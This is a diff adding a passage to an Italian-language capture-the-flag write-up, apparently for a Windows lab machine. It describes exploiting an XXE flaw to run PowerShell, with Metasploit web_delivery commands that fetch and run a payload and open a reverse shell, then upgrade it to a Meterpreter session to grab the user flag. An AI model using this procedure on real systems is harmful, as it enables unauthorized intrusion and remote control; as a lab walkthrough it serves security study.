@@ -58,3 +58,29 @@ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
 ```
 
 Avvio nc in ascolto anche sulla mia macchina ed eccomi collegato tramite una reverse shell! 
+
+*Versione 2*
+
+Sfruttando la vulnerabilità sopracitata, si modifica l'xxe mettendo come comando Powershell.exe ed argomento l'output rilasciato da WebDelivery di Metasploit. Quindi, la procedura sarà la seguente:
+
+```
+msf5 > use exploit/multi/script/web_delivery
+msf5 > set target 2
+msf5 > set payload windows/x64/shell/reverse_tcp   <- con meterpreter non funzia!
+msf5 > set srvport,host ...
+msf5 > run
+
+*Copio lo shellcode dentro al frammento di xxe, lo inoltro al server, quindi mi si aprirà una sessione che metterò in background*
+
+msf5 > use post/multi/manage/shell_to_meterpreter
+msf5 > set session X 
+msf5 > run
+
+*Attendo la migrazione*
+
+msf5 > sessions -i Y
+```
+
+Avrò una sessione con meterpreter! Adesso prelevo lo user flag! 
+
+## Privilege Escalation
